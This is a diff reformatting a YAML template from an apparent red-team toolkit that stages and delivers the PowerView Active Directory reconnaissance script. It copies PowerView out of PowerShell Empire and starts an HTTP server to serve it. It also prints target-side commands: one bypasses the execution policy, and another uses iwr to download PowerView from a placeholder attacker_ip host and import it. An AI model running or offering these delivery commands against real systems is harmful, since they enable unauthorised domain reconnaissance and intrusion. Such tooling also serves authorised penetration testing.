@@ -1,15 +1,16 @@
----
 metadata:
-  filename: "deliver-windows-powerview.ps1.yaml"
-  tags: ["windows", "domain"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation: powershell -ep bypass'; \
-  echo 'Deliver and import module: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powerview.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\powerview.ps1; Import-Module <%=$(esh variables/delivery_path_windows)%>\powerview.ps1'; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-powerview.ps1.yaml
+  tags:
+  - windows
+  - domain
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1\
+  \ packstation/outbound; \\\necho '================================================================';\
+  \ \\\necho '                      -----PowerShell-----                      '; \\\
+  \necho 'Preparation: powershell -ep bypass'; \\\necho 'Deliver and import module:\
+  \ iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powerview.ps1 -Outfile\
+  \ {{ delivery_path_windows }}\\powerview.ps1; Import-Module {{ delivery_path_windows\
+  \ }}\\powerview.ps1'; \\\necho '================================================================';\
+  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
+  \ delivery_outbound_port }} -d packstation/outbound\n"
